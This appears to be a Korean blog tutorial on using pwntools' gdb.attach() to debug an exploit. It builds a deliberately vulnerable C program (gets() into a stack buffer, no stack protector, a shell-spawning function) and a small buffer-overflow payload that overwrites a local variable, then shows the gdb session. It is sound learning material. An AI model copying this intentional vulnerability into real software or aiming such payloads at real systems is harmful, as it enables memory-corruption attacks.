---
title: gdb.attach()
date: 2024-04-09 07:30:00 +0900
categories: [Misc, Settings]
tags: [gdb.attach()]
math: true
mermaid: true
---
파이썬 익스플로잇 코드를 작성한 뒤, gdb를 통해 익스플로잇 코드와 함께 바이너리를 디버깅을하고 싶을때 **`gdb.attach()`**를 사용한다.

## gdb.attach()
```c
// test
// gcc -o test test.c -fno-stack-protector

#include <stdio.h>

void present()
{
	system("/bin/sh");
}

int main()
{
	int changeit = 1337;
	char buf[32] = { 0, };
	
	gets(buf);

	if (changeit == 0xdeadbeef)
	{
		printf("Congraz!!\n");
		present();
	}

	return 0;
}
```

위 예시 코드를 기반으로 익스플로잇 코드와 gdb.attach()를 사용해본다.

```py
# ex.py

from pwn import *

p = process('./test')

payload = b"A"*44
payload += p64(0xdeadbeef)

gdb.attach(p)   # gdb.attach() 사용          

p.sendline(payload)
p.interactive()
```
> `gdb.attach`()가 안될 시, 원하는 곳에 `pause()`를 놓고 실행한 다음 새 터미널 창에서 `sudo gdb attach -p [pid]`로 수동으로 디버깅 한다.
{: .prompt-tip }

gdb.attach()가 실행된다면, 새 창에서 gdb가 열린다.

자신이 원하는 부분에 `bp`를 설정하고 `c`명령어로 실행한다.

```bash
pwndbg> b * main+68
Breakpoint 1 at 0x60de1d0b31ec
pwndbg> c
Continuing.

Breakpoint 1, 0x000060de1d0b31ec in main ()
```

해당 부분을 확인해보면 `changeit`이 `0xdeadbeef`로 바뀐 것을 볼 수 있다.

```bash
pwndbg> x/x $rbp - 4
0x7ffe8ce1c5dc:	0xdeadbeef
```